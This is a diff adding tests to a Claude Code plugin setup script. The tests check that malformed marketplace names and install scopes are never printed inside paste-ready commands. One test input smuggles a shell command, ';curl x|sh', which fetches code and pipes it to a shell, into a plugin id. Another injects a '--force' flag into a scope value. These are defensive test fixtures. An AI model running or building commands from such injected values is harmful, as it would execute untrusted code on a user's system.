@@ -209,6 +209,21 @@ describe("Claude Code plugin: the plugin provides the server, and updates it", (
     expect(output()).toContain("disabled in your user settings");
   });
 
+  it("a marketplace name that is not a plain name is never printed inside a command to paste", () => {
+    plugin(OLD, { id: "4da@evil;curl x|sh" });
+    runSetup({}, ctx, log);
+    expect(output()).not.toMatch(/^ +claude plugin (update|marketplace update)/m);
+    expect(output()).toContain("update it from Claude Code's /plugin menu");
+    expect(output()).not.toMatch(/^ +claude mcp add /m);
+  });
+
+  it("an install scope that is not one of Claude Code's is not printed as --scope", () => {
+    plugin(OLD, { scope: "user --force" });
+    runSetup({}, ctx, log);
+    expect(output()).not.toContain("--scope user --force");
+    expect(output()).toContain("/plugin menu");
+  });
+
   it("another plugin whose name ends in 4da is not this one", () => {
     plugin(OLD, { id: "not4da@market" });
     runSetup({}, ctx, log);
